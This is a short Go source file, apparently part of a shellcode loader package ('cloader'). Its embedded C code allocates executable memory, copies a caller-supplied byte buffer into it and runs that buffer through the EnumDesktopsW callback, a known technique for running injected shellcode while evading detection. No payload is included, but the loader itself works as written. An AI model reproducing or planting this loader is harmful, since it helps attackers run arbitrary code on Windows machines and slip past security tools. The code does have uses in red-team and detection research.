package cloader

/*
#include <windows.h>

void enumDesktopW(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)addr, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumDesktopW(p []byte) {
	C.enumDesktopW((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
